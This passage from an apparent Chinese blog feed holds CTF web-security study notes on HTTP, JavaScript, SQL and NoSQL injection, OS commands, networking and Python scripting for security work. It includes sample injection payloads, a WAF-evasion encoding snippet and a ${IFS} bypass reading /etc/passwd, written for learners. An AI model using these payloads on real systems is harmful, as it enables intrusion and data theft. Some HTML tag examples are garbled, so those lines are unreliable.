        <content type="html"><![CDATA[<h4 id="1-2-1-1-HTTP-HTTPS-协议"><a href="#1-2-1-1-HTTP-HTTPS-协议" class="headerlink" title="1.2.1.1 HTTP&#x2F;HTTPS 协议"></a>1.2.1.1 HTTP&#x2F;HTTPS 协议</h4><ol><li>请求方法</li></ol><ul><li><p>基础方法：GET（参数暴露 URL，长度限制）、POST（参数藏请求体，适合传敏感数据）</p></li><li><p>冷门但关键方法：OPTIONS（探测服务器允许的请求方法，SSRF &#x2F; 跨域漏洞常用）、PUT（文件上传漏洞可能利用）、DELETE（高危操作，部分靶机未限制导致文件删除）、HEAD（仅返回响应头，用于信息收集）</p></li></ul><ol start="2"><li>状态码</li></ol><ul><li><p>2xx 成功：200 OK（正常响应，需抓包分析内容）、204 No Content（无响应体，可能藏隐写）</p></li><li><p>3xx 跳转：301 永久重定向（域名跳转跟踪）、302 临时重定向（常用来绕过访问限制）、304 Not Modified（缓存利用，可能绕过更新检测）</p></li><li><p>4xx 客户端错：401 未授权（需爆破 &#x2F; 伪造凭证）、403 禁止访问（目录遍历 &#x2F; 权限绕过突破口）、404 未找到（路径猜解 &#x2F; 目录扫描）、405 方法不允许（结合 OPTIONS 探测替代方法）</p></li><li><p>5xx 服务器错：500 内部错误（代码执行 &#x2F; 注入漏洞触发）、502 网关错误（SSRF 探测内网服务）</p></li></ul><ol start="3"><li>核心请求头（伪造 &#x2F; 篡改高频）</li></ol><ul><li><p>Host：指定目标域名，SSRF &#x2F; 主机头注入利用</p></li><li><p>Referer：来源验证绕过（伪造合法来源）</p></li><li><p>User-Agent：伪装客户端（手机 &#x2F; 爬虫 &#x2F; 特定浏览器，绕过客户端检测）</p></li><li><p>Cookie：会话维持（伪造 admin Cookie、Session 劫持）</p></li><li><p>Content-Type：请求体格式（application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data（文件上传）、application&#x2F;json（JSON 注入））</p></li><li><p>Authorization：基础认证 &#x2F; Bearer Token（爆破 &#x2F; 伪造凭证）</p></li><li><p>X-Forwarded-For&#x2F;X-Real-IP：伪造 IP（绕过 IP 白名单限制）</p></li></ul><ol start="4"><li>响应头（安全配置与漏洞点）</li></ol><ul><li><p>Set-Cookie：会话创建（关注 HttpOnly、Secure、SameSite 属性，XSS 利用关键）</p></li><li><p>Content-Security-Policy（CSP）：XSS 防护策略（分析绕过规则）</p></li><li><p>Access-Control-Allow-Origin（CORS）：跨域资源共享（配置不当导致跨域漏洞）</p></li></ul><ol start="5"><li>HTTPS 核心（中间人攻击 &#x2F; 证书问题）</li></ol><ul><li><p>TLS 握手流程（证书验证环节，CTF 中可能出现伪造证书 &#x2F; 弱加密套件漏洞）</p></li><li><p>证书组成（公钥、签名，漏洞场景：自签名证书、过期证书、域名不匹配）</p></li><li><p>常见加密套件（ECDHE-RSA-AES256-GCM-SHA384 等，弱套件如 DES-CBC 可能被破解）</p></li></ul><p><strong>核心理解</strong>：HTTP 是明文传输（抓包可直接获取数据），HTTPS 通过 TLS 加密传输层（抓包需配置证书解密）；CTF 中协议漏洞多源于 “头字段篡改”“方法滥用”“状态码误判”。</p><h4 id="1-2-1-2-HTML-CSS-JavaScript-基础"><a href="#1-2-1-2-HTML-CSS-JavaScript-基础" class="headerlink" title="1.2.1.2 HTML&#x2F;CSS&#x2F;JavaScript 基础"></a>1.2.1.2 HTML&#x2F;CSS&#x2F;JavaScript 基础</h4><ol><li>HTML 核心（漏洞载体与信息收集）</li></ol><ul><li><p>基础标签：<code>表单提交，关注action/method/input属性）、</code>触发核心标签，src&#x2F;innerHTML 属性）、<code>&gt;</code>（XSS 触发：onerror 事件、src 伪造）、<code>跳转链接，href注入）、</code>域 &#x2F; SSRF 利用）</p></li><li><p>表单元素：input（type&#x3D;text&#x2F;password&#x2F;hidden，hidden 字段可能藏关键参数）、select&#x2F;textarea（前端数据提交载体）</p></li><li><p>特殊标签：<code>&lt;meta&gt;</code>（跳转 &#x2F; 编码设置，如 http-equiv&#x3D;”refresh”）、<code>&gt;</code>（注释中可能藏 flag &#x2F; 路径）</p></li></ul><ol start="2"><li>CSS 核心（前端隐藏与信息挖掘）</li></ol><ul><li><p>选择器：id 选择器（#id）、类选择器（.class）、标签选择器（用于定位前端关键元素）</p></li><li><p>关键属性：display:none（隐藏内容，CTF 中常用来藏 flag）、visibility:hidden（隐藏但占位置）、position:absolute（绝对定位，可能覆盖关键按钮）</p></li><li><p>伪类：:hover&#x2F;:active（交互触发的样式变化，可能暴露隐藏功能）</p></li></ul><ol start="3"><li>JavaScript 核心</li></ol><ul><li><p>DOM 操作（DOM 型 XSS 基础）</p><ul><li><p>核心对象：document（document.cookie 获取 Cookie、document.getElementById 定位元素）、window（window.location 跳转、window.alert 弹窗）</p></li><li><p>危险方法：innerHTML（直接插入 HTML，XSS 重灾区）、eval ()（代码执行，注入恶意 JS）、setTimeout ()&#x2F;setInterval ()（定时执行代码）</p></li></ul></li><li><p>事件机制（交互触发漏洞）</p><ul><li><p>常用事件：onclick（点击）、onload（页面加载）、onerror（错误触发）、oninput（输入触发）</p></li><li><p>事件冒泡 &#x2F; 委托（影响 XSS 触发范围）</p></li></ul></li><li><p>异步请求（抓包分析关键）</p><ul><li><p>AJAX：XMLHttpRequest 对象（open () 方法的请求方式 &#x2F; URL，send () 的参数）</p></li><li><p>Fetch API：Promise 风格请求（关注 method、body、headers 参数，常藏后端接口）</p></li></ul></li><li><p>数据处理（前端加密 &#x2F; 解密）</p><ul><li><p>字符串方法：slice ()、substr ()、replace ()（CTF 中常用来破解前端简单加密）</p></li><li><p>编码函数：encodeURI ()、encodeURIComponent ()（URL 编码绕过）</p></li><li><p>JSON 处理：JSON.parse ()&#x2F;JSON.stringify ()（JSON 注入 &#x2F; 数据泄露）</p></li></ul></li></ul><p><strong>核心理解</strong>：HTML 是页面结构载体，CSS 控制样式，JavaScript 实现交互；CTF 中前端漏洞（XSS、逻辑绕过）本质是 “用户输入未被过滤就插入页面 &#x2F; 执行代码”。</p><h4 id="1-2-1-3-数据库基础（MySQL、MongoDB-等）"><a href="#1-2-1-3-数据库基础（MySQL、MongoDB-等）" class="headerlink" title="1.2.1.3 数据库基础（MySQL、MongoDB 等）"></a>1.2.1.3 数据库基础（MySQL、MongoDB 等）</h4><ol><li>MySQL 基础（SQL 注入核心）</li></ol><ul><li><p>语法规则：</p><ul><li><p>基础查询：<code>SELECT 字段 FROM 表名 WHERE 条件</code>（联合查询：UNION SELECT，CTF 注入核心）</p></li><li><p>子查询：<code>SELECT * FROM users WHERE id IN (SELECT id FROM admin)</code></p></li><li><p>限制结果：<code>LIMIT 偏移量, 条数</code>（注入时逐行提取数据）</p></li><li><p>注释符：<code>#</code>、<code>-- </code>（空格必须）、<code>/* */</code>（注入时截断 SQL 语句）</p></li></ul></li><li><p>核心函数（注入数据提取）：</p><ul><li><p>字符串拼接：<code>CONCAT(字段1,字段2)</code>、<code>GROUP_CONCAT(字段 SEPARATOR &#39;,&#39;)</code>（批量提取数据）</p></li><li><p>字符串截取：<code>SUBSTR(字段, 起始位置, 长度)</code>、<code>MID()</code></p></li><li><p>长度计算：<code>LENGTH(字段)</code>（盲注时判断数据长度）</p></li><li><p>编码转换：<code>HEX()</code>、<code>UNHEX()</code>（绕过特殊字符过滤）</p></li><li><p>其他：<code>MD5()</code>（密码破解）、<code>USER()</code>（当前数据库用户）、<code>DATABASE()</code>（当前数据库名）</p></li></ul></li><li><p>系统库与表（注入信息收集）：</p><ul><li><p><code>information_schema</code>：MySQL 元数据库，<code>tables</code>表存所有表名，<code>columns</code>表存所有列名</p></li><li><p>关键查询：<code>SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()</code></p></li></ul></li><li><p>数据类型：INT（数字型注入）、VARCHAR&#x2F;TEXT（字符型注入，需闭合引号）</p></li></ul><ol start="2"><li>MongoDB 基础（NoSQL 注入考点）</li></ol><ul><li><p>数据结构：文档（Document）、集合（Collection）、数据库（Database），无固定表结构</p></li><li><p>核心查询语法：</p><ul><li><p>基础查询：<code>db.集合名.find(&#123;查询条件&#125;)</code>（如<code>db.users.find(&#123;username:&quot;admin&quot;&#125;)</code>）</p></li><li><p>比较操作符：<code>$eq</code>（等于）、<code>$ne</code>（不等于）、<code>$gt</code>（大于）、<code>$lt</code>（小于）（NoSQL 注入常用，如<code>&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:&quot;test&quot;&#125;&#125;</code>）</p></li><li><p>逻辑操作符：<code>$and</code>、<code>$or</code>、<code>$not</code></p></li><li><p>正则查询：<code>db.集合名.find(&#123;字段:/正则表达式/&#125;)</code>（注入时绕过登录，如<code>&#123;&quot;username&quot;:/admin/&#125;</code>）</p></li></ul></li><li><p>注入相关：</p><ul><li><p><code>$where</code>操作符：支持 JavaScript 表达式（如<code>&#123;&quot;$where&quot;:&quot;this.username==&#39;admin&#39;&quot;&#125;</code>，注入时构造<code>&#123;&quot;$where&quot;:&quot;1==1&quot;&#125;</code>）</p></li><li><p>字段不存在判断：<code>&#123;&quot;username&quot;:&#123;&quot;$exists&quot;:true&#125;&#125;</code></p></li></ul></li></ul><p><strong>核心理解</strong>：SQL 注入的本质是 “用户输入被当作 SQL 语句执行”，NoSQL 注入是 “用户输入被当作查询条件解析”；CTF 中需掌握 “如何通过注入语法获取数据库结构与数据”。</p><p><em><strong>其他数据库请自行拓展相关知识面：如oralce、mssql、postsql等等。</strong></em></p><h4 id="1-2-1-4-操作系统基础（Linux、Windows）"><a href="#1-2-1-4-操作系统基础（Linux、Windows）" class="headerlink" title="1.2.1.4 操作系统基础（Linux、Windows）"></a>1.2.1.4 操作系统基础（Linux、Windows）</h4><ol><li>Linux 系统（Web &#x2F; 靶机高频）</li></ol><ul><li><p>常用命令（命令执行漏洞核心）：</p><ul><li><p>信息收集：<code>ls</code>（列目录）、<code>pwd</code>（当前路径）、<code>whoami</code>（当前用户）、<code>id</code>（用户权限）、<code>uname -a</code>（系统版本）</p></li><li><p>文件操作：<code>cat</code>（读文件）、<code>more/less</code>（分屏读）、<code>head/tail</code>（读首尾行）、<code>find / -name 文件名</code>（查找文件，如 flag）</p></li><li><p>网络操作：<code>ifconfig/ip addr</code>（查看 IP）、<code>netstat -tuln</code>（查看开放端口）、<code>ping</code>（探测存活）</p></li><li><p>权限操作：<code>chmod +x 脚本</code>（加执行权限）、<code>sudo</code>（提权）</p></li></ul></li><li><p>目录结构（文件读取漏洞目标）：</p><ul><li><p>敏感目录：<code>/etc/passwd</code>（用户列表）、<code>/etc/shadow</code>（加密密码，需 root 权限）、<code>/var/log</code>（日志文件）、<code>/tmp</code>（临时目录，可写文件）</p></li><li><p>Web 目录：<code>/var/www/html</code>（Apache 默认）、<code>/usr/share/nginx/html</code>（Nginx 默认）</p></li></ul></li><li><p>命令拼接（命令执行绕过）：</p><ul><li><p>管道符：<code>|</code>（执行后面命令）、<code>||</code>（前面失败则执行后面）、<code>&amp;&amp;</code>（前面成功则执行后面）</p></li><li><p>重定向：<code>&gt;</code>（覆盖写文件）、<code>&gt;&gt;</code>（追加写文件）、<code>2&gt;&amp;1</code>（错误输出重定向）</p></li><li><p>空格替代：<code>$&#123;IFS&#125;</code>、<code>&lt;</code>（绕过空格过滤，如<code>cat$&#123;IFS&#125;/etc/passwd</code>）</p></li></ul></li></ul><ol start="2"><li>Windows 系统（部分靶机 &#x2F; 内网场景）</li></ol><ul><li><p>常用命令：</p><ul><li><p>信息收集：<code>dir</code>（列目录）、<code>cd</code>（切换目录）、<code>whoami</code>（当前用户）、<code>ipconfig</code>（IP 信息）、<code>tasklist</code>（进程列表）</p></li><li><p>文件操作：<code>type</code>（读文件）、<code>more</code>（分屏读）、<code>findstr &quot;关键词&quot; 文件名</code>（查找内容）</p></li><li><p>网络操作：<code>ping</code>、<code>netstat -ano</code>（查看端口与进程 PID）、<code>net user</code>（用户列表）</p></li></ul></li><li><p>目录结构：</p><ul><li><p>敏感目录：<code>C:\Windows\system32</code>（系统命令目录）、<code>C:\Users\Administrator\Desktop</code>（管理员桌面，可能有 flag）、<code>C:\Program Files</code>（软件安装目录）</p></li><li><p>Web 目录：<code>C:\xampp\htdocs</code>（XAMPP 默认）、<code>C:\wamp\www</code>（WAMP 默认）</p></li></ul></li><li><p>权限基础：管理员权限（可执行更多命令，如<code>net localgroup administrators</code>添加管理员）、普通用户权限（限制部分操作）</p></li></ul><p><strong>核心理解</strong>：CTF 中命令执行漏洞本质是 “用户输入被当作系统命令执行”；需掌握 “常用命令的作用”“敏感文件路径”“命令拼接绕过技巧”。</p><p><em><strong>除了上述内容，请自行拓展相关知识面，如linux 的发行版本、内核版本相关的提权漏洞以及应用，和不同linux系统的基本使用方法，红帽、debian、cots、Ubuntu，windows server等等</strong></em></p><h3 id="1-2-1-5-计算机网络基础（TCP-IP、DNS、端口）"><a href="#1-2-1-5-计算机网络基础（TCP-IP、DNS、端口）" class="headerlink" title="1.2.1.5 计算机网络基础（TCP&#x2F;IP、DNS、端口）"></a>1.2.1.5 计算机网络基础（TCP&#x2F;IP、DNS、端口）</h3><ol><li>TCP&#x2F;IP 四层模型（CTF 流量分析 &#x2F; 漏洞原理核心）</li></ol><ul><li><p>四层完整拆解 + CTF 考点：</p><ul><li><p>应用层：HTTP、HTTPS、FTP、SSH、DNS、SMB、Telnet（漏洞高发层，如 FTP 匿名登录、SSH 弱口令、SMB 永恒之蓝漏洞）</p></li><li><p>传输层：TCP（可靠传输）、UDP（不可靠传输）（CTF 中协议漏洞载体，如 TCP 三次握手漏洞、UDP 广播风暴利用）</p></li><li><p>网络层：IP（地址转发）、ICMP（控制消息）、ARP（地址解析）（考点：IP 欺骗、ICMP 隧道通信、ARP 欺骗断网）</p></li><li><p>数据链路层：以太网帧、MAC 地址（考点：MAC 地址伪造、交换机端口劫持、流量嗅探前提）</p></li></ul></li><li><p>数据传输流程（流量分析基础）：</p><ul><li><p>封装过程：应用层数据 → 传输层加端口 → 网络层加 IP → 数据链路层加 MAC → 物理层传输</p></li><li><p>解封装过程：反向拆解，最终提取应用层数据（CTF 中 PCAP 流量分析核心步骤）</p></li></ul></li></ul><ol start="2"><li>TCP 协议核心（可靠传输与漏洞点）</li></ol><ul><li><p>三次握手（连接建立，CTF 攻击场景）：</p><ul><li><p>流程：客户端 SYN → 服务器 SYN+ACK → 客户端 ACK</p></li><li><p>漏洞利用：SYN Flood 攻击（发送大量 SYN 包不回 ACK，耗尽服务器连接资源）、伪造 SYN 包（欺骗服务器建立连接，获取敏感响应）</p></li></ul></li><li><p>四次挥手（连接关闭，流量分析考点）：</p><ul><li><p>流程：主动方 FIN → 被动方 ACK → 被动方 FIN → 主动方 ACK</p></li><li><p>分析要点：异常关闭（如无 FIN 包直接 RST，可能是服务崩溃 &#x2F; 攻击触发）</p></li></ul></li><li><p>关键标志位（流量包分析核心）：</p><ul><li><p>SYN（建立连接）、ACK（确认）、FIN（关闭连接）、RST（强制关闭）、PSH（推送数据）</p></li><li><p>CTF 应用：通过标志位序列判断连接状态（如大量 SYN+ACK 无后续 ACK，可能是端口开放但无服务响应）</p></li></ul></li><li><p>滑动窗口与拥塞控制（进阶）：</p><ul><li>流量分析中判断网络状况（如窗口为 0 可能是网络拥堵，需结合漏洞场景分析）</li></ul></li></ul><ol start="3"><li>UDP 协议核心（无连接特性与 CTF 利用）</li></ol><ul><li><p>核心特点：无连接、不可靠、速度快（无需握手 &#x2F; 挥手）</p></li><li><p>常见应用服务：DNS（53 端口）、DHCP（67&#x2F;68 端口）、TFTP（69 端口）、SNMP（161 端口）</p></li><li><p>CTF 漏洞场景：</p><ul><li><p>UDP 广播包泄露（如 DHCP 包泄露内网 IP 段、SNMP 包泄露设备信息）</p></li><li><p>无连接特性滥用（如 UDP 反射攻击、伪造 UDP 包欺骗服务）</p></li><li><p>弱服务爆破（如 TFTP 匿名上传 &#x2F; 下载文件、SNMP 社区字符串爆破）</p></li></ul></li></ul><ol start="4"><li>DNS 协议（域名解析）</li></ol><ul><li><p>核心功能：将域名（如 <a href="https://www.xxx.com/">www.xxx.com</a>）解析为 IP 地址（如 192.168.1.1）</p></li><li><p>关键查询类型：</p><ul><li><p>A 记录：域名→IPv4 地址（基础解析，判断目标服务器 IP）</p></li><li><p>AAAA 记录：域名→IPv6 地址（少数靶机涉及 IPv6 场景）</p></li><li><p>CNAME 记录：域名别名（子域名劫持漏洞常用，如别名指向不存在的域名可劫持）</p></li><li><p>MX 记录：邮件服务器地址（邮件伪造 &#x2F; 爆破考点）</p></li><li><p>TXT 记录：文本信息（CTF 高频藏 flag 位置，如 <code>dig txt xxx.com</code> 提取 flag）</p></li><li><p>NS 记录：域名服务器（判断权威 DNS，可能存在 DNS 缓存投毒漏洞）</p></li></ul></li><li><p>解析流程（漏洞利用基础）：</p><ul><li><p>本地 DNS 缓存 → 根服务器 → 顶级域服务器 → 权威 DNS 服务器</p></li><li><p>漏洞场景：DNS 缓存投毒（篡改本地缓存，指向恶意 IP）、DNS 劫持（中间篡改解析结果）</p></li></ul></li><li><p>CTF 常用操作：</p><ul><li><p>子域名爆破（工具：Subfinder、Amass，查找隐藏后台域名如 <a href="https://admin.xxx.com/">admin.xxx.com</a>）</p></li><li><p>反向 DNS 解析（通过 IP 查域名，扩大攻击面）</p></li><li><p>DNS 隧道（通过 DNS 包传输数据，绕过防火墙限制，CTF 流量分析可能遇到）</p></li></ul></li></ul><ol start="5"><li>端口与服务（信息收集核心）</li></ol><ul><li><p>端口基础：</p><ul><li><p>端口范围：0-65535（0-1023 为知名端口，1024-49151 为注册端口，49152+ 为动态端口）</p></li><li><p>端口状态（Nmap 扫描结果）：开放（服务监听）、关闭（无服务监听）、过滤（防火墙拦截）</p></li></ul></li><li><p>CTF 高频端口与对应服务 &#x2F; 漏洞：</p><ul><li><p>21&#x2F;FTP：文件传输协议（匿名登录、弱口令爆破、文件上传漏洞）</p></li><li><p>22&#x2F;SSH：远程登录（弱口令、密钥登录、SSH 隧道）</p></li><li><p>80&#x2F;HTTP：Web 服务（目录扫描、漏洞探测核心端口）</p></li><li><p>443&#x2F;HTTPS：加密 Web 服务（证书分析、SSL 漏洞如 Heartbleed）</p></li><li><p>3306&#x2F;MySQL：数据库服务（弱口令爆破、远程连接注入）</p></li><li><p>3389&#x2F;RDP：Windows 远程桌面（弱口令、暴力破解、RDP 劫持）</p></li><li><p>5432&#x2F;PostgreSQL：数据库服务（弱口令、未授权访问）</p></li><li><p>6379&#x2F;Redis：缓存数据库（未授权访问、文件写入 Getshell）</p></li><li><p>8080&#x2F;8081：Web 中间件（Tomcat、Jetty，可能存在后台管理弱口令）</p></li><li><p>27017&#x2F;MongoDB：NoSQL 数据库（未授权访问、弱口令）</p></li></ul></li><li><p>端口扫描工具与技巧（CTF 信息收集必用）：</p><ul><li><p>Nmap 常用参数：<code>nmap -sS 目标IP</code>（SYN 扫描，隐蔽快速）、<code>nmap -sV 目标IP</code>（探测服务版本）、<code>nmap -p- 目标IP</code>（全端口扫描）</p></li><li><p>绕过防火墙：<code>nmap -f</code>（分片扫描）、<code>nmap -sT</code>（TCP 全连接扫描，适用于防火墙允许的场景）</p></li></ul></li></ul><ol start="6"><li>网络地址与路由（内网渗透基础）</li></ol><ul><li><p>IP 地址分类（CTF 内网场景）：</p><ul><li><p>A 类（1.0.0.0-126.255.255.255）、B 类（128.0.0.0-191.255.255.255）、C 类（192.0.0.0-223.255.255.255）</p></li><li><p>私有 IP 段（内网靶机常用）：10.0.0.0&#x2F;8、172.16.0.0&#x2F;12、192.168.0.0&#x2F;16</p></li></ul></li><li><p>子网掩码与网关（路由判断）：</p><ul><li><p>子网掩码：区分网络位与主机位（如 255.255.255.0 对应 &#x2F;24 子网）</p></li><li><p>网关：内网主机访问外网的出口（CTF 中 SSRF 探测内网网关，如 192.168.1.1）</p></li></ul></li><li><p>路由表（流量转发分析）：</p><ul><li>核心作用：决定数据转发路径（CTF 中内网渗透时，通过路由表判断可达网段）</li></ul></li></ul><p><strong>核心理解</strong>：计算机网络基础是 CTF 信息收集、流量分析、漏洞利用的底层支撑 ——TCP&#x2F;UDP 协议分析帮助解读流量包中的攻击痕迹，DNS 解析助力找到隐藏目标，端口扫描定位可攻击服务，IP 与路由知识支撑内网渗透；CTF 中网络相关考点本质是 “利用协议设计缺陷或配置不当，获取目标信息或触发漏洞”。</p><h2 id="1-2-1-6-Python语言基础（Web安全必备）"><a href="#1-2-1-6-Python语言基础（Web安全必备）" class="headerlink" title="1.2.1.6 Python语言基础（Web安全必备）"></a>1.2.1.6 Python语言基础（Web安全必备）</h2><h3 id="关键掌握点：核心语法、安全相关库、实战场景"><a href="#关键掌握点：核心语法、安全相关库、实战场景" class="headerlink" title="关键掌握点：核心语法、安全相关库、实战场景"></a>关键掌握点：核心语法、安全相关库、实战场景</h3><h4 id="1-核心语法速通"><a href="#1-核心语法速通" class="headerlink" title="1. 核心语法速通"></a>1. 核心语法速通</h4><ul><li><p>基础数据类型与结构：字符串（str）、列表（list）、字典（dict）、元组（tuple），重点掌握字符串拼接、切片操作（用于构造Payload）、字典键值对解析（用于处理HTTP请求参数）。</p></li><li><p>流程控制：条件判断（if-elif-else）、循环（for&#x2F;while），常用于批量测试漏洞（如枚举目录、爆破参数）。</p></li><li><p>函数与模块：自定义函数、import导入模块，核心掌握<code>os</code>、<code>sys</code>、<code>requests</code>等安全常用模块的调用方式。</p></li><li><p>异常处理：try-except语句，用于处理漏洞探测中的网络异常、参数错误等问题，避免脚本中断。</p></li></ul><h4 id="2-Web安全核心库实战"><a href="#2-Web安全核心库实战" class="headerlink" title="2. Web安全核心库实战"></a>2. Web安全核心库实战</h4><ul><li><p>requests库（HTTP请求发送）：</p></li><li><p>核心功能：发送GET&#x2F;POST请求、设置请求头（Headers）、携带Cookie、处理会话（Session）、文件上传模拟。</p></li><li><p>实战示例：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送带Cookie的GET请求</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: <span class="string">&quot;abc123xyz&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&quot;http://target.com/user/info&quot;</span>, headers=headers, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)  <span class="comment"># 打印响应内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST表单请求</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">post_response = requests.post(<span class="string">&quot;http://target.com/login&quot;</span>, data=data)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>urllib库（URL处理与请求）：</p></li><li><p>核心功能：URL编码&#x2F;解码（urllib.parse.quote&#x2F;unescape）、构造URL请求、处理代理。</p></li><li><p>实战示例：URL编码Payload规避WAF</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;and 1=1 union select 1,flag from flag&quot;</span></span><br><span class="line"></span><br><span class="line">encoded_payload = quote(payload)  <span class="comment"># 对Payload进行URL编码</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">f&quot;http://target.com/index.php?id=1<span class="subst">&#123;encoded_payload&#125;</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>subprocess库（系统命令执行）：</p></li><li><p>核心功能：调用系统命令、获取命令执行结果，常用于编写漏洞利用脚本（如反弹Shell、执行系统命令）。</p></li><li><p>实战示例：执行系统命令并获取输出</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line">result = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">output = result.stdout.read().decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(output)  <span class="comment"># 输出命令执行结果</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>socket库（网络编程基础）：</p></li><li><p>核心功能：创建TCP&#x2F;UDP连接、发送&#x2F;接收数据，常用于编写简单的端口扫描脚本、反弹Shell接收端。</p></li><li><p>实战示例：简单的TCP端口扫描</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan_port</span>(<span class="params">ip, port</span>):</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.settimeout(<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">s.connect((ip, port))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;端口 <span class="subst">&#123;port&#125;</span> 开放&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;端口 <span class="subst">&#123;port&#125;</span> 关闭&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">scan_port(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-Web安全实战场景应用"><a href="#3-Web安全实战场景应用" class="headerlink" title="3. Web安全实战场景应用"></a>3. Web安全实战场景应用</h4><ul><li><p>漏洞探测脚本：利用requests库批量发送请求，检测SQL注入、XSS等漏洞（如遍历参数值判断响应差异）。</p></li><li><p>EXP编写：针对特定漏洞（如ThinkPHP RCE、Log4j2），使用Python编写漏洞利用脚本，自动化执行攻击流程。</p></li><li><p>数据处理：解析HTTP响应内容（如提取Cookie、提取敏感数据）、处理扫描工具输出结果（如整理sqlmap扫描报告）。</p></li><li><p>工具扩展：通过Python编写Burp Suite插件（如自定义Payload生成器、漏洞检测规则），扩展工具功能。</p></li></ul><h4 id="4-必备学习资源与工具"><a href="#4-必备学习资源与工具" class="headerlink" title="4. 必备学习资源与工具"></a>4. 必备学习资源与工具</h4><ul><li><p>在线环境：Python Tutor（可视化代码执行流程）、Replit（在线编写运行Python代码，无需本地配置）。</p></li><li><p>学习文档：Python官方文档（docs.python.org）、requests库官方文档（requests.readthedocs.io）。</p></li><li><p>实战项目：CTF中常见的Python脚本案例（如目录扫描脚本、SQL盲注脚本）、GitHub上的安全工具源码阅读（如sqlmap、dirsearch）。</p></li></ul><p><em><strong>要求达到能熟练使用py编写各种工具和脚本</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言malloc使用</title>
      <link href="/2025/12/01/C%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80%E7%BB%83%E4%B9%A0/%E6%8C%87%E9%92%88/"/>
      <url>/2025/12/01/C%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80%E7%BB%83%E4%B9%A0/%E6%8C%87%E9%92%88/</url>
      
